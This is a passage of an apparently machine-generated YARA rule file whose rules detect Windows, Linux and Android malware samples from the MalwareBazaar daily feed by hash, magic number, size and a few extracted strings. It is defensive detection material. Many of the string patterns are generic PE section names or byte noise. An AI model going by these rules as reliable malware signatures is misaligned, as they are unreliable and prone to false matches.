        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4436KB
        and all of them
}

rule Windows_166b798b46ade1deb2065fdae79134537ca4eaa83ad3a4598878b07ac94c8861
{
    meta:
        description = "Auto ML: 166b798b46ade1deb2065fdae79134537ca4eaa83ad3a4598878b07ac94c8861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.managed"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5471KB
        and all of them
}

rule Windows_ea3eb80612d2c63022e0b649b6bfe11ee97a20920bc97f2ff423571b8594a9e3
{
    meta:
        description = "Auto ML: ea3eb80612d2c63022e0b649b6bfe11ee97a20920bc97f2ff423571b8594a9e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3612KB
        and all of them
}

rule Windows_ea625f82fef9caeef34a90f6a239676f8b830ad127152c89cac75dc6824c986c
{
    meta:
        description = "Auto ML: ea625f82fef9caeef34a90f6a239676f8b830ad127152c89cac75dc6824c986c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6687KB
        and all of them
}

rule Linux_ea6f0dd8a16f8b66691ebe44af651b00e9bd4cc76346ad17314cda0672784d7f
{
    meta:
        description = "Auto ML: ea6f0dd8a16f8b66691ebe44af651b00e9bd4cc76346ad17314cda0672784d7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "}b`fBr-a"
        $s3 = "APe|l3j"
        $s4 = "AmH|g;\"."
        $s5 = "/<a\"OCR"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB
        and all of them
}

rule Windows_ea895be4bc7006fdb8e25a849c0aa26000c12b25d7a0342890a110ef79f9662f
{
    meta:
        description = "Auto ML: ea895be4bc7006fdb8e25a849c0aa26000c12b25d7a0342890a110ef79f9662f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8082KB
        and all of them
}

rule Windows_eaa7090b669f319c0668f25a2ae7d78aa1d23503ad6289d0b699acd1ed635944
{
    meta:
        description = "Auto ML: eaa7090b669f319c0668f25a2ae7d78aa1d23503ad6289d0b699acd1ed635944"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $s5 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB
        and all of them
}

rule Windows_eab4a2382263fbfedbddaed6cd19627ba3d5d9f5db8060a2a1adc2b1c4ca7125
{
    meta:
        description = "Auto ML: eab4a2382263fbfedbddaed6cd19627ba3d5d9f5db8060a2a1adc2b1c4ca7125"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5088KB
        and all of them
}

rule Windows_eb249d8b90aa5fa4627166c0a495f1cdb2a66bf59469a5fb7790a7aad13673fd
{
    meta:
        description = "Auto ML: eb249d8b90aa5fa4627166c0a495f1cdb2a66bf59469a5fb7790a7aad13673fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_eb5b21fb9d2151803fe67c0624c3c3c4c12c44392db1d4c668d33fc9b84f6900
{
    meta:
        description = "Auto ML: eb5b21fb9d2151803fe67c0624c3c3c4c12c44392db1d4c668d33fc9b84f6900"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "Remote"
        $s5 = "AssemblyCompanyAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 503KB
        and all of them
}

rule Windows_eb916eb723273fae9324b464bfb6f405d77a2b1b48a0a498de5676d54a0a38a8
{
    meta:
        description = "Auto ML: eb916eb723273fae9324b464bfb6f405d77a2b1b48a0a498de5676d54a0a38a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Linux_eb959c0408d63d9afa27d2ebd9c599798c1354db594be1718bb9710afb949f7b
{
    meta:
        description = "Auto ML: eb959c0408d63d9afa27d2ebd9c599798c1354db594be1718bb9710afb949f7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "y$Qdl%"
        $s2 = "%od Nd"
        $s3 = "Sytm9$"
        $s4 = "xMxhYW"
        $s5 = "Uw+5pq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_166cbf3c1dbadae88b99b409f7c08afa849b5426c17e0fcff28bc6c7d31b379d
{
    meta:
        description = "Auto ML: 166cbf3c1dbadae88b99b409f7c08afa849b5426c17e0fcff28bc6c7d31b379d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".clam01"
        $s4 = ".clam02"
        $s5 = ".clam03"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB
        and all of them
}

rule Linux_eb9b5052a1447534caef413105d71c62b888421bddd12fb56d31a371934bc0e9
{
    meta:
        description = "Auto ML: eb9b5052a1447534caef413105d71c62b888421bddd12fb56d31a371934bc0e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "viwQ6L@"
        $s2 = "rG:D8gY["
        $s3 = "i]Ym}B"
        $s4 = "h*PG^Z"
        $s5 = "*&iJm3>Q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Android_eba381ace2936c6cdf4c17b7f1847f394c677ed967abcd3f6503bc35e54122e1
{
    meta:
        description = "Auto ML: eba381ace2936c6cdf4c17b7f1847f394c677ed967abcd3f6503bc35e54122e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "META-INF/com/android/build/gradle/app-metadata.propertiesK,("
        $s2 = "M-ILI,I"
        $s3 = "assets/dexopt/baseline.profpro"
        $s4 = "J}JWl4"
        $s5 = "ukyec8V"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 85780KB
        and all of them
}

rule Windows_ebb6ee582848de55de5d4088a59636a6f38d62c87ecdb96a8963046d85252507
{
    meta:
        description = "Auto ML: ebb6ee582848de55de5d4088a59636a6f38d62c87ecdb96a8963046d85252507"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".cabube"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB
        and all of them
}

rule Linux_ebda5250a8c9fbc3d0a84aed0067c084698246be607bb8aa57c0fd751f14d8c0
{
    meta:
        description = "Auto ML: ebda5250a8c9fbc3d0a84aed0067c084698246be607bb8aa57c0fd751f14d8c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "h\\N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "/|apxe"
        $s5 = "NuNqNV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB
        and all of them
}

rule Windows_ebf36abacdc2c0a0960f10db12171e48a0fd1a962f2497223fa411d645a78469
{
    meta:
        description = "Auto ML: ebf36abacdc2c0a0960f10db12171e48a0fd1a962f2497223fa411d645a78469"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "(5Richa"
        $s3 = "wv&H9&w"
        $s4 = "SW7{HN"
        $s5 = ":(*pWIY"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1351KB
        and all of them
}

rule Linux_ec290f43906d38164409c75f65b4bd1515a3a20da00f29ae7028d1f9561fb7fa
{
    meta:
        description = "Auto ML: ec290f43906d38164409c75f65b4bd1515a3a20da00f29ae7028d1f9561fb7fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "vfb(=X(?"
        $s2 = "Q<I\\mH"
        $s3 = "AoA{KC"
        $s4 = "DDD!G2$EE"
        $s5 = "LEFF$C2"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_ec49ea3da7d627ad17042d48b66b1c8fbfd840e3e2b5920ea0509a735d9175d2
{
    meta:
        description = "Auto ML: ec49ea3da7d627ad17042d48b66b1c8fbfd840e3e2b5920ea0509a735d9175d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB
        and all of them
}

rule Windows_ec934a185eaa6cbb76232ab9643e1f579da5515717fe2f78c4de2e3ab8e27707
{
    meta:
        description = "Auto ML: ec934a185eaa6cbb76232ab9643e1f579da5515717fe2f78c4de2e3ab8e27707"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "qtqztygm"
        $s3 = "vdtwlssc"
        $s4 = ".pdata"
        $s5 = "f'AW'V"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7113KB
        and all of them
}

rule Windows_ecbaeab79bb9ff98c691ffddfd29e59282af48d48a87fbe20cb94dc83c1c89f3
{
    meta:
        description = "Auto ML: ecbaeab79bb9ff98c691ffddfd29e59282af48d48a87fbe20cb94dc83c1c89f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".xoyetu"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_eccfd9f2d1d935f03d9fbdb4605281c7a8c23b3791dc33ae8d3c75e0b8fbaec6
{
    meta:
        description = "Auto ML: eccfd9f2d1d935f03d9fbdb4605281c7a8c23b3791dc33ae8d3c75e0b8fbaec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "D$`SVW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 381KB
        and all of them
}

rule Windows_168264e04849c4a91f916419a9485f9831040d6926fe1faa27b342dcc1e039e9
{
    meta:
        description = "Auto ML: 168264e04849c4a91f916419a9485f9831040d6926fe1faa27b342dcc1e039e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB
        and all of them
}

rule Linux_ecee74b397919c63c4a1427587ce9ab9c3bb62a280330a3ddcdb873d1f813c6a
{
    meta:
        description = "Auto ML: ecee74b397919c63c4a1427587ce9ab9c3bb62a280330a3ddcdb873d1f813c6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "xAPPSh"
        $s2 = "D$,Ph8b"
        $s3 = "u%WWSS"
        $s4 = "t@;D$xu"
        $s5 = "wcQWUR"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB
        and all of them
}

rule Linux_ecfb33cfd3a8fb92e1097c93143e816701a4aaf44ff817acd0c7e1f6bcdb4481
{
    meta:
        description = "Auto ML: ecfb33cfd3a8fb92e1097c93143e816701a4aaf44ff817acd0c7e1f6bcdb4481"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB
        and all of them
}

rule Windows_ecfe89307878026257826ff9a3f994d0219099355bc019de45b85cda770d925d
{
    meta:
        description = "Auto ML: ecfe89307878026257826ff9a3f994d0219099355bc019de45b85cda770d925d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhr4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 213KB
        and all of them
}

rule Windows_ed347277bed3d64edf62b11c0c3b15e559a36807c13f6d0036afeb8554b1f506
{
    meta:
        description = "Auto ML: ed347277bed3d64edf62b11c0c3b15e559a36807c13f6d0036afeb8554b1f506"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "& uBrP*"
        $s5 = "& PvnI*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5515KB
        and all of them
}

rule Windows_ed521f9314ec81688174f7c3b29e128339bf7586e930b1dca76a8e165b9cb5b5
{
    meta:
        description = "Auto ML: ed521f9314ec81688174f7c3b29e128339bf7586e930b1dca76a8e165b9cb5b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".zogoj"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB
        and all of them
}

rule Windows_ed7ac88af0b59c8cacfbd17cfa2c85d6648026f95c82efa70e9cb98134f007b1
{
    meta:
        description = "Auto ML: ed7ac88af0b59c8cacfbd17cfa2c85d6648026f95c82efa70e9cb98134f007b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "@.idata"
        $s3 = ".themida"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4936KB
        and all of them
}

rule Windows_ed926217f9c0ac06a4349c5a3e2b0bbd8e8d162fc20cb6083a7f86457690af6b
{
    meta:
        description = "Auto ML: ed926217f9c0ac06a4349c5a3e2b0bbd8e8d162fc20cb6083a7f86457690af6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 928KB
        and all of them
}

rule Linux_edc1a7fda1d6a02bbcc94a09be6b886b90d6c2aca1e5830c1a4bb841e0466bf4
{
    meta:
        description = "Auto ML: edc1a7fda1d6a02bbcc94a09be6b886b90d6c2aca1e5830c1a4bb841e0466bf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "pN^NuNV"
        $s2 = "E8N^NuNV"
        $s3 = "N^NuNV"
        $s4 = "OHWHQHy"
        $s5 = "/A-THo-TB"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB
        and all of them
}

rule Windows_ede06cac185471f1c554ae147570c8dc6fafa9b580dcf4dfcfe5db3d0b6b6422
{
    meta:
        description = "Auto ML: ede06cac185471f1c554ae147570c8dc6fafa9b580dcf4dfcfe5db3d0b6b6422"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "t$Gffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 394KB
        and all of them
}

rule Windows_ede93512a69d3d17e3e881f934c08df17bcd1855f872b674ad1c2480dda3e816
{
    meta:
        description = "Auto ML: ede93512a69d3d17e3e881f934c08df17bcd1855f872b674ad1c2480dda3e816"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4469KB
        and all of them
}

rule Linux_16c6939e58bf7f1431c6ea29cc30b221f4d1773d07baadfd15143d4b7becf081
{
    meta:
        description = "Auto ML: 16c6939e58bf7f1431c6ea29cc30b221f4d1773d07baadfd15143d4b7becf081"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "expand 32-byte k"
        $s2 = "undefined"
        $s3 = "abcdefghijklmnopqrstuvw012345678"
        $s4 = "/proc/"
        $s5 = "hey skido"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 200KB
        and all of them
}

rule Windows_ee360a49633521f9de9070d9494277fa2fc7246a9529c9a9b2125a40948d4a8e
{
    meta:
        description = "Auto ML: ee360a49633521f9de9070d9494277fa2fc7246a9529c9a9b2125a40948d4a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "uRFGHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1308KB
        and all of them
}

rule Linux_ee5ad4f256c89ac9dd9d96f384cabbe25a731835561f9741b1314d51f66a014a
{
    meta:
        description = "Auto ML: ee5ad4f256c89ac9dd9d96f384cabbe25a731835561f9741b1314d51f66a014a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "^eOM]Ef"
        $s2 = "^CjV-R"
        $s3 = "&QqeJk"
        $s4 = "jWhVH'"
        $s5 = "qe#=eq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_ee7f176672fb6774c261d8eb419db32d66dcd350aebc465e34860d80eb573485
{
    meta:
        description = "Auto ML: ee7f176672fb6774c261d8eb419db32d66dcd350aebc465e34860d80eb573485"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!zaM V!"
        $s5 = "#ae !03Pa}"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 363KB
        and all of them
}

rule Windows_ee8623307bbea96542aa91b81601f9b4362cc474fa4257628f99e3bb087c3f4c
{
    meta:
        description = "Auto ML: ee8623307bbea96542aa91b81601f9b4362cc474fa4257628f99e3bb087c3f4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "ExtensionAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB
        and all of them
}

rule Linux_ee9b7c784a5edcae84b067e6fb6c9e171abae8114747c7deee8a91ff90da5ff2
{
    meta:
        description = "Auto ML: ee9b7c784a5edcae84b067e6fb6c9e171abae8114747c7deee8a91ff90da5ff2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRh&m"
        $s2 = "9t$$tBVVj"
        $s3 = ";|$(t:WWj"
        $s4 = ";|$(t:PPj"
        $s5 = "C)QQWP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB
        and all of them
}

rule Windows_eea6c4cb7a9e580441c2a4c9debd6b143c9a06a68580c8666246975ea6af32cb
{
    meta:
        description = "Auto ML: eea6c4cb7a9e580441c2a4c9debd6b143c9a06a68580c8666246975ea6af32cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Windows_ef05c02e9a2ce2b6ed7c7d8e994c389383f357dc60da206560001f8978b19ead
{
    meta:
        description = "Auto ML: ef05c02e9a2ce2b6ed7c7d8e994c389383f357dc60da206560001f8978b19ead"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c
{
    meta:
        description = "Auto ML: ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "connect"
        $s4 = "sigemptyset"
        $s5 = "memmove"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB
        and all of them
}

rule Linux_efcf32d9515a8d32926d27ac029a5b91ad482354bdba6396ce892810bec30e2f
{
    meta:
        description = "Auto ML: efcf32d9515a8d32926d27ac029a5b91ad482354bdba6396ce892810bec30e2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "a qb!q"
        $s2 = "c4s2a1R"
        $s3 = "R)B3gCh"
        $s4 = "Q3dse#f"
        $s5 = "qQSRVSWTXUYVZW["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB
        and all of them
}

rule Windows_efe63a2db88d9166eb773f1c479a642b3d05494ade91263e53cd61f06e5d0d59
{
    meta:
        description = "Auto ML: efe63a2db88d9166eb773f1c479a642b3d05494ade91263e53cd61f06e5d0d59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Wine builtin DLL"
        $s2 = "t be run in DOS mode."
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.idata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 52KB
        and all of them
}

rule Linux_171b6ee729d08135b26b3784bffd1de202717a543c5d8969d613be7a500c86aa
{
    meta:
        description = "Auto ML: 171b6ee729d08135b26b3784bffd1de202717a543c5d8969d613be7a500c86aa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "=6kN~Gp"
        $s2 = "S))wOLmr"
        $s3 = "R2j}Kigv3"
        $s4 = "<P9#GkF"
        $s5 = "x8Ray}"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_f0164ec8c236a65046db19bb07dc24d20c7785bf1adc0823d89b568164dae9b0
{
    meta:
        description = "Auto ML: f0164ec8c236a65046db19bb07dc24d20c7785bf1adc0823d89b568164dae9b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 805KB
        and all of them
}

rule Windows_f062b66382f86660deaed4d0af191706f0d62432c9bd4f1bb75a2b292eed4f8b
{
    meta:
        description = "Auto ML: f062b66382f86660deaed4d0af191706f0d62432c9bd4f1bb75a2b292eed4f8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 858KB
        and all of them
}

rule Windows_f08afadff8298941a488a237df4deb8f94f13bf274411548f386d2828f4df636
{
    meta:
        description = "Auto ML: f08afadff8298941a488a237df4deb8f94f13bf274411548f386d2828f4df636"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "$vG;Ds"
        $s3 = "ziHeL42"
        $s4 = "dh,N5s7EPH"
        $s5 = "ZKeXvHS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 665KB
        and all of them
}

rule Linux_f09fee162d20a6465d89d6973195773d235a9518501676d56c2d6be54aefcfff
{
    meta:
        description = "Auto ML: f09fee162d20a6465d89d6973195773d235a9518501676d56c2d6be54aefcfff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "E$VRWP"
        $s2 = "xAPPSh"
        $s3 = "u%WWSS"
